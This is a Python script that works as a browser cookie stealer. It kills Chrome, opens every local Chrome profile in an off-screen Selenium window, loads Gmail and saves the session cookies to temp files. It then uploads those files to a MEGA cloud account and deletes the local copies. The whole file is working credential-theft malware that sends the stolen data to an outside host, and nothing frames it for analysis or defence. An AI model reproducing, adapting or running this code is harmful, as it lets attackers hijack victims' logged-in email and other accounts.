import pickle
import os
from os import environ, path
from selenium import webdriver
import chromedriver_autoinstaller


def send_mega():
    from mega import Mega
    mega = Mega()
    m = mega.login(username, password)
    for i in send:
        m.upload(i)
        os.remove(i)


def start():
    global send
    os.system("taskkill /f /im  chrome.exe")
    chrome = path.join(environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")

    profile = []
    send = []

    for i in os.listdir(chrome):
        if i.startswith("Profile"):
            profile.append(i)

    for k in profile:
        chromedriver_autoinstaller.install()
        options = webdriver.ChromeOptions()
        options.add_argument(f'user-data-dir={chrome}')
        options.add_argument(f'profile-directory={k}')
        options.add_argument("window-position=-2000,0")
        driver = webdriver.Chrome(options=options)
        driver.get('https://mail.google.com/mail/u/0/#inbox')

        cookies = driver.get_cookies()
        temp = path.join(environ["USERPROFILE"], "AppData", "Local", "Temp", f"cookies_{k}.pkl")
        send.append(temp)
        pickle.dump(cookies, open(temp, "wb"))
        driver.quit()


if __name__ == '__main__':

    username = " mega email "
    password = " mega password "

    start()
    send_mega()
